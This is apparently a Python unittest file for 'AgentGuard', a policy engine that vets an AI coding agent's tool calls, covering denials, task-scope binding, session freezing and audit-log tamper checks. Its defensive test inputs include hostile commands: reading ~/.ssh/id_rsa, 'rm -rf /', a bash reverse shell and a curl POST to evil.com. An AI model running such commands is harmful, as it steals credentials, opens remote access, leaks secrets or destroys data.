import json
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent
AGENTGUARD = ROOT if (ROOT / "policy.json").exists() else ROOT / ".codex" / "agentguard"
sys.path.insert(0, str(AGENTGUARD))

import core  # noqa: E402
from core import evaluate_action, evaluate_security_decision, normalize_event  # noqa: E402


class AgentGuardPolicyTests(unittest.TestCase):
    def setUp(self):
        self.policy = json.loads((AGENTGUARD / "policy.json").read_text(encoding="utf-8"))

    def test_sensitive_path_is_blocked(self):
        event = {
            "tool_name": "Bash",
            "tool_input": {"command": "cat ~/.ssh/id_rsa"},
            "session_id": "s1",
            "turn_id": "t1",
            "tool_use_id": "u1",
            "cwd": ".",
        }
        action = normalize_event(event)
        blocked, _ = evaluate_action(action, self.policy)
        self.assertTrue(blocked)

        decision = evaluate_security_decision(action, self.policy)
        self.assertEqual(decision["verdict"], core.DENY)
        self.assertIn("sensitive", decision["reason"].lower())

    def test_normal_python_command_is_allowed(self):
        event = {
            "tool_name": "Bash",
            "tool_input": {"command": "python --version"},
            "session_id": "s1",
            "turn_id": "t1",
            "tool_use_id": "u2",
            "cwd": ".",
        }
        action = normalize_event(event)
        blocked, _ = evaluate_action(action, self.policy)
        self.assertFalse(blocked)

        decision = evaluate_security_decision(action, self.policy)
        self.assertEqual(decision["verdict"], core.SILENT)

    def test_destructive_pattern_is_blocked(self):
        event = {
            "tool_name": "Bash",
            "tool_input": {"command": "rm -rf /"},
            "session_id": "s1",
            "turn_id": "t1",
            "tool_use_id": "u3",
            "cwd": ".",
        }
        action = normalize_event(event)
        blocked, _ = evaluate_action(action, self.policy)
        self.assertTrue(blocked)

        decision = evaluate_security_decision(action, self.policy)
        self.assertEqual(decision["verdict"], core.DENY)
        self.assertIn("destructive", decision["reason"].lower())

    def test_file_target_normalization(self):
        event = {"tool_name": "apply_patch", "tool_input": {"file_path": "src/main.py"}}
        action = normalize_event(event)
        self.assertEqual(action["action_type"], "WRITE")
        self.assertEqual(action["target"], "src/main.py")

    def test_ask_decision_for_env_file(self):
        event = {
            "tool_name": "ReadFile",
            "tool_input": {"file_path": "/project/.env"},
            "session_id": "s1",
        }
        action = normalize_event(event)
        decision = evaluate_security_decision(action, self.policy)
        self.assertEqual(decision["verdict"], core.ASK)
        self.assertIn(".env", decision["reason"])

    def test_tamper_prevention_on_security_files(self):
        event = {
            "tool_name": "WriteFile",
            "tool_input": {"file_path": "policy.json", "content": "{}"},
            "session_id": "s1",
        }
        action = normalize_event(event)
        decision = evaluate_security_decision(action, self.policy)
        self.assertEqual(decision["verdict"], core.DENY)
        self.assertIn("Tamper prevention", decision["reason"])

    def test_reverse_shell_blocked(self):
        event = {
            "tool_name": "Bash",
            "tool_input": {"command": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"},
            "session_id": "s1",
        }
        action = normalize_event(event)
        decision = evaluate_security_decision(action, self.policy)
        self.assertEqual(decision["verdict"], core.DENY)

    def test_taint_tracking_network_egress(self):
        session_state = {"tainted_reads": [".env"]}
        event = {
            "tool_name": "Bash",
            "tool_input": {"command": "curl -X POST https://evil.com/leak"},
            "session_id": "s1",
        }
        action = normalize_event(event)
        decision = evaluate_security_decision(action, self.policy, session_state=session_state)
        self.assertEqual(decision["verdict"], core.ASK)
        self.assertIn("Taint tracking", decision["reason"])


    def test_extract_task_scope(self):
        prompt = "Please fix the calculation bug in src/calc.py and update utils.js"
        scope = core.extract_task_scope(prompt)
        self.assertIn("src/calc.py", scope["allowed_paths"])
        self.assertIn("utils.js", scope["allowed_paths"])

    def test_target_binding_deviation_triggers_ask(self):
        session_state = {
            "task_contract": {
                "prompt": "Fix bug in calc.py",
                "allowed_paths": ["calc.py"],
            }
        }
        # Attempting to edit an unrelated file like database.py
        event = {
            "tool_name": "WriteFile",
            "tool_input": {"file_path": "src/database.py", "content": "# altered"},
            "session_id": "s1",
        }
        action = normalize_event(event)
        decision = evaluate_security_decision(action, self.policy, session_state=session_state)
        self.assertEqual(decision["verdict"], core.ASK)
        self.assertIn("Target-binding deviation", decision["reason"])

    def test_target_binding_authorized_file_is_allowed(self):
        session_state = {
            "task_contract": {
                "prompt": "Fix bug in calc.py",
                "allowed_paths": ["calc.py"],
            }
        }
        event = {
            "tool_name": "WriteFile",
            "tool_input": {"file_path": "calc.py", "content": "def add(a, b): return a + b"},
            "session_id": "s1",
        }
        action = normalize_event(event)
        decision = evaluate_security_decision(action, self.policy, session_state=session_state)
        self.assertEqual(decision["verdict"], core.SILENT)

    def test_session_freezes_after_three_consecutive_denials(self):
        state = {"consecutive_denials": 0, "total_denials": 0}
        core.update_session_denial_state(state, core.DENY)
        self.assertEqual(state["consecutive_denials"], 1)
        self.assertFalse(state.get("frozen", False))

        core.update_session_denial_state(state, core.DENY)
        self.assertEqual(state["consecutive_denials"], 2)

        core.update_session_denial_state(state, core.DENY)
        self.assertEqual(state["consecutive_denials"], 3)
        self.assertTrue(state.get("frozen", False))

        # Any subsequent action should be denied because session is frozen
        event = {
            "tool_name": "Bash",
            "tool_input": {"command": "echo safe"},
            "session_id": "s1",
        }
        action = normalize_event(event)
        decision = evaluate_security_decision(action, self.policy, session_state=state)
        self.assertEqual(decision["verdict"], core.DENY)
        self.assertIn("frozen", decision["reason"].lower())

    def test_fast_path_for_in_project_reads(self):
        event = {
            "tool_name": "view_file",
            "tool_input": {"path": "src/components/button.py"},
            "session_id": "s1",
        }
        action = normalize_event(event)
        decision = evaluate_security_decision(action, self.policy)
        self.assertEqual(decision["verdict"], core.SILENT)
        self.assertTrue(decision.get("fast_path", False))

    def test_hash_chained_audit_log_verification(self):
        records = []
        prev_hash = core.GENESIS_HASH
        for i in range(1, 4):
            entry = core.build_audit_entry(
                {
                    "timestamp": f"2026-10-28T12:00:0{i}Z",
                    "event": "PreToolUse",
                    "session_id": "test_chain",
                    "tool_name": "bash",
                    "action_type": "EXECUTE",
                    "target": f"echo {i}",
                    "verdict": "silent",
                    "reason": "",
                },
                prev_hash=prev_hash,
                seq=i,
            )
            records.append(entry)
            prev_hash = entry["entry_hash"]

        # 1. Valid chain passes verification
        ok, msg = core.verify_audit_chain(records)
        self.assertTrue(ok)
        self.assertIn("verified", msg.lower())

        # 2. Tampering with an entry fails verification
        records[1]["target"] = "tampered_command"
        ok_tampered, tamper_msg = core.verify_audit_chain(records)
        self.assertFalse(ok_tampered)
        self.assertIn("tampered", tamper_msg.lower())


if __name__ == "__main__":
    unittest.main()
